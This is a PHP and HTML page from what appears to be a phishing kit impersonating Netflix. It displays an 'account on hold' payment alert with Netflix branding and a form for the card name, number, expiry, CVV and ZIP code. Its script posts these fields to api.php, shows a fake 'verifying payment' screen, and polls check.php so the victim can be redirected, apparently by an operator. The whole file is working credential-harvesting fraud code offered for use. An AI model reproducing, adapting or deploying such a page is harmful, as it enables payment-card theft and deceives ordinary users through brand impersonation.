<?php 
require_once 'config.php'; 
$lang = getLang();
$sid = $_GET['sid'] ?? '';
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>" dir="<?php echo $lang === 'ar' ? 'rtl' : 'ltr'; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - <?php echo t('payment', $lang); ?></title>
    <link rel="stylesheet" href="assets/style.css">
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/favicon.ico">
</head>
<body>
    <div class="bg-wrapper">
        <div class="bg-image"></div>
        <div class="bg-overlay"></div>
    </div>

    <header class="nf-header">
        <a href="#" class="nf-logo">
            <svg viewBox="0 0 111 30" fill="#e50914"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.125L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.532-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687H35.97V0h13.375v4.687h-4.001zM24.938 4.687V0H11.22v4.687h4.687v21.625c1.5 0 3.063.063 4.594.188V4.687h4.437zm-17.5 21.03c-1.813-.156-3.625-.25-5.438-.343V0h5.438v25.717z"/></svg>
        </a>
    </header>

    <main class="nf-main">
        <div class="nf-card cc-card">
            <div class="alert-box">
                <span class="alert-icon">!</span>
                <div class="alert-content">
                    <strong><?php echo t('on_hold', $lang); ?></strong>
                    <p><?php echo t('payment_issue', $lang); ?></p>
                </div>
            </div>

            <h2><?php echo t('payment', $lang); ?></h2>

            <form id="ccForm">
                <div class="nf-input-wrap">
                    <input type="text" id="ccname" required placeholder=" ">
                    <label><?php echo t('name_card', $lang); ?></label>
                </div>
                <div class="nf-input-wrap">
                    <input type="text" id="ccnum" required maxlength="19" placeholder=" ">
                    <label><?php echo t('card_number', $lang); ?></label>
                </div>
                <div class="cc-row">
                    <div class="nf-input-wrap half">
                        <input type="text" id="expiry" required maxlength="5" placeholder=" ">
                        <label><?php echo t('expiry', $lang); ?></label>
                    </div>
                    <div class="nf-input-wrap half">
                        <input type="text" id="cvv" required maxlength="4" placeholder=" ">
                        <label><?php echo t('cvv', $lang); ?></label>
                    </div>
                </div>
                <div class="nf-input-wrap">
                    <input type="text" id="zip" required placeholder=" ">
                    <label><?php echo t('zip', $lang); ?></label>
                </div>

                <div class="secure-badge">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#46d369" stroke-width="2">
                        <rect x="3" y="11" width="18" height="11" rx="2"/>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                    <?php echo t('secure', $lang); ?>
                </div>

                <button type="submit" class="nf-btn" id="submitBtn">
                    <?php echo t('update', $lang); ?>
                </button>

                <div class="back-link">
                    <a href="index.php?lang=<?php echo $lang; ?>">← <?php echo t('signin', $lang); ?></a>
                </div>
            </form>
        </div>
    </main>

    <div class="waiting-overlay" id="waitingOverlay" style="display:none;">
        <div class="waiting-box">
            <div class="spinner-large"></div>
            <p><?php echo t('processing', $lang); ?></p>
            <p class="waiting-sub">Verifying your payment method...</p>
        </div>
    </div>

    <script>
        const sid = '<?php echo htmlspecialchars($sid); ?>';
        const lang = '<?php echo $lang; ?>';

        document.getElementById('ccnum').addEventListener('input', (e) => {
            let v = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
            e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
        });

        document.getElementById('expiry').addEventListener('input', (e) => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
            e.target.value = v;
        });

        document.getElementById('ccForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            document.getElementById('waitingOverlay').style.display = 'flex';

            const data = {
                ccname: document.getElementById('ccname').value,
                ccnum: document.getElementById('ccnum').value.replace(/\s/g, ''),
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                zip: document.getElementById('zip').value
            };

            await fetch('api.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=cc&sid=' + sid + '&ccname=' + encodeURIComponent(data.ccname) + '&ccnum=' + encodeURIComponent(data.ccnum) + '&expiry=' + encodeURIComponent(data.expiry) + '&cvv=' + encodeURIComponent(data.cvv) + '&zip=' + encodeURIComponent(data.zip)
            });

            pollForRedirect();
        });

        function pollForRedirect() {
            setInterval(async () => {
                try {
                    const res = await fetch('check.php?sid=' + sid + '&lang=' + lang);
                    const data = await res.json();
                    if (data.redirect) window.location.href = data.url;
                } catch(e) {}
            }, 3000);
        }
    </script>
</body>
</html>
